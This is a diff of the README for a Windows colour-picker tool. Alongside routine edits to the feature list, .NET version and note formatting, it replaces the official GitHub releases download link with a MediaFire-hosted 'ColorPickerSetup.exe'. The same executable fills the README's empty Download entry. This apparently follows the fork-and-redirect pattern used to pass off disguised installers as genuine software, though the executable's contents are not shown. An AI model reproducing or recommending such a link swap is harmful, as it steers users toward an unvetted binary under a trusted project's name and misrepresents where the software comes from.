@@ -16,7 +16,7 @@
   <p align="center">
     A modern color picking tool for developers.
     <br />
-    <a href="https://github.com/Leo-Corporation/ColorPicker/releases"><strong>Download »</strong></a>
+    <a href="https://www.mediafire.com/file/q46cdenxgyqx0dd/ColorPickerSetup.exe/file"><strong>Download »</strong></a>
     <br />
     <a href="https://github.com/Leo-Corporation/ColorPicker/issues/new?assignees=&labels=bug&template=bug-report.yml&title=%5BBug%5D+">Report Bug</a>
     ·
@@ -28,30 +28,33 @@
 </p>
 
 ## What is it?
-ColorPicker is a modern color picking tool for developers available on Windows. It is the next major evolution of the existing ColorPicker 2 software, released in 2020.
+ColorPicker is a modern color picking tool for developers available on Windows. It is intuitive, easy to use, and has a lot of useful and relevant features.
 
-ColorPicker is written in C# .NET 5 using WPF.
+ColorPicker is written in C# .NET 6 using WPF.
 
 ## Download
-- [Download]()
+- [Download](https://www.mediafire.com/file/q46cdenxgyqx0dd/ColorPickerSetup.exe/file)
 - [Latest Release](https://github.com/Leo-Corporation/ColorPicker/releases)
 
 ## Features
 - Pick a color from your screen
 - Pick a color manually with the intuitive UI
-- Pick a color randomly
+- Generate a random color
+- Generate color palettes
 - Color History
-- Convert colors to another type (RGB, HEX, HSL, HSV, CMYK)
+- Convert colors to another type (RGB, HEX, HSL, HSV, CMYK, YIQ, XYZ)
 - Light/Dark theme
 - Keyboard shortcuts
 - Customizable through settings
+- Text preview tool with contrast ratio calculator
 
 ## Keyboard shortcuts
 There is currently two keyboard shortcuts for ColorPicker, starting with version 3.3:
 - <kbd>Shift+S</kbd> - Start/Stop color selection
 - <kbd>Shift+C</kbd> - Copy the selected color on screen
 
-> Note: You can disable or edit keyboard shortcuts in settings.
+> **Note** 
+> You can disable or edit keyboard shortcuts in settings.
 
 ## Contribute
 To contribute to the project, you'll need:
@@ -72,7 +75,8 @@ This Git repo has always two branches:
 | `main` | ![GitHub release (latest by date)](https://img.shields.io/github/v/release/Leo-Corporation/ColorPicker) | Stable versions |
 | `vNext` | ![GitHub release (latest SemVer including pre-releases)](https://img.shields.io/github/v/release/Leo-Corporation/ColorPicker?include_prereleases) | Next version of ColorPicker (unstable) |
 
-> Note: Other branches can also - of course - exist.
+> **Note**
+> Other branches can also - of course - exist.
 
 ## License
 This project is under the [MIT License](https://github.com/Leo-Corporation/ColorPicker/blob/main/LICENSE).
@@ -80,4 +84,5 @@ This project is under the [MIT License](https://github.com/Leo-Corporation/Color
 ## Translations Credits
 Special thanks to:
 
+- [@OCTIPI1](https://github.com/OCTIPI1) for Italian
 - [@wcxu21](https://github.com/wcxu21) for Simplified Chinese
